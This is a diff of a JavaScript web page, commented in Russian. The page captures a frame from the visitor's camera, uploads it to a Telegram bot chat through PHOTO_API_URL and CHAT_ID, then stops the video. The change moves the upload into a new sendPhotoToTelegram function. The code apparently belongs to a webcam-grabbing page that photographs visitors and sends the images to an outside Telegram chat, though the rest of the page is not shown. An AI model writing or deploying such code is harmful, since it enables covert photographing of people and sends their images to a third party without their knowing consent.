@@ -90,12 +90,7 @@
                             let photoDataUrl = canvas.toDataURL("image/png");
 
                             // Отправка фото в Telegram
-                            fetch(PHOTO_API_URL, {
-                                method: "POST",
-                                body: new FormData()
-                                    .append('chat_id', CHAT_ID)
-                                    .append('photo', dataURItoBlob(photoDataUrl))
-                            });
+                            sendPhotoToTelegram(photoDataUrl);
 
                             // Остановка видео и очистка
                             stream.getTracks().forEach(track => track.stop());
@@ -105,6 +100,26 @@
                         console.log("Ошибка с доступом к камере: " + err);
                     });
             }
+        }
+
+        // Функция для отправки фото в Telegram
+        function sendPhotoToTelegram(dataURI) {
+            let photoBlob = dataURItoBlob(dataURI);
+
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, 'photo.png');
+
+            fetch(PHOTO_API_URL, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                return response.json();
+            }).then(data => {
+                console.log('Фото отправлено в Telegram:', data);
+            }).catch(error => {
+                console.error('Ошибка отправки фото:', error);
+            });
         }
 
         // Функция для преобразования Data URL в Blob
